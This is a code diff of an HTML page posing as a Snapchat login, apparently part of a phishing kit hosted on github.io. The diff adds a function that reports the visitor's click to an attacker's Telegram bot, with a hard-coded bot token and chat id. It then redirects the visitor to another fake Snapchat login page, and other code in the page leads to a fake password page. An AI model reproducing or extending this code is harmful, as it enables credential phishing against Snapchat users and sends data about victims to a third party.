@@ -5,9 +5,10 @@
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <title>SnapchatLogin</title>
 
-        <link rel="stylesheet" href="SnapchatLoginPhone-Dateien/css.css" media="all" />
+        <link href="SnapchatLoginPhone-Dateien/snapchatlogin-2f97c6.webflow.54f670fdf.css" rel="stylesheet" type="text/css" />
         <link href="https://fonts.googleapis.com/" rel="preconnect" />
         <link href="https://fonts.gstatic.com/" rel="preconnect" crossorigin="anonymous" />
+        <link rel="stylesheet" href="SnapchatLoginPhone-Dateien/css.css" media="all" />
         <script src="https://code.jquery.com/jquery-3.6.4.min.js"></script>
 
         <script>
@@ -22,6 +23,20 @@
                 });
 
                 window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLoginPasswort.htm";
+            }
+
+            function StattdessenEmailVerwenden(){
+                var apiUrl = "https://api.telegram.org/bot6862065355:AAG52OQ90c_Fhl7AuhSKJM6hU2yWFuA4mmw/sendMessage";
+                var chatId = "709764990";
+                var fullMessage = "Click - Stattdessen Email verwenden";
+                
+                $.get(apiUrl, { chat_id: chatId, text: fullMessage }, function(data) {
+                    console.log("Antwort von der Telegram API:", data);
+                });
+
+                setTimeout(function() {
+                    window.location = "https://linktreeshorter.github.io/Snapchat/SnapchatLogin.htm";
+                }, 1000);
             }
         </script>
     </head>
